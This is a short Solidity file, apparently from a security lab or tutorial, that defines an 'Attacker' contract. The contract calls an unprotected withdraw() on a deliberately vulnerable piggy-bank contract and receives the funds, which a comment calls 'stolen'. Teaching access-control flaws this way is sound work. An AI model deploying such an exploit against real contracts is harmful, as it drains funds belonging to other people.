// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerablePiggyBank {
    function withdraw() external;
}

contract Attacker {
    address payable public attackerAddress;
    IVulnerablePiggyBank public piggyBank;

    constructor(address _piggyBank) {
        attackerAddress = payable(msg.sender);
        piggyBank = IVulnerablePiggyBank(_piggyBank);
    }

    function attack() external {
        // Anyone can call withdraw in vulnerable version
        piggyBank.withdraw();
    }

    // Receive stolen funds
    receive() external payable {}
}
